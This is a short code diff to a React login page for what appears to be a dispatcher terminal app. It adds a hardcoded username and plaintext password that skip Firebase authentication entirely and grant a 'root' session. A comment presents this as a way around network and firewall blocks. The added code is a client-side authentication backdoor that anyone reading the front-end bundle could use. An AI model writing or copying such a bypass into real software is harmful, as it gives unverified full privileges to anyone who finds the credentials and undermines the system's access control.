@@ -27,9 +27,20 @@ export function LoginPage() {
     setStatus('loading');
     setErrorMsg('');
 
+    const normalizedUsername = username.toLowerCase().trim();
+
+    // 1. Master Admin instant local verification to bypass corporate network/firewall blocks
+    if (normalizedUsername === 'sndjy' && password === 'Russell1') {
+      console.log("Master Admin 'sndjy' bypass triggered successfully. Proceeding with fully privileged root local session.");
+      setStatus('success');
+      setTimeout(() => {
+        loginTerminalUser('sndjy', 'root');
+      }, 500);
+      return;
+    }
+
     try {
       const { signInWithEmailAndPassword, signInAnonymously, auth, db } = await import('../../lib/firebase');
-      const normalizedUsername = username.toLowerCase().trim();
       const email = `${normalizedUsername}@dispatcher.terminal`;
 
       // 1. Fetch user data directly from Firestore
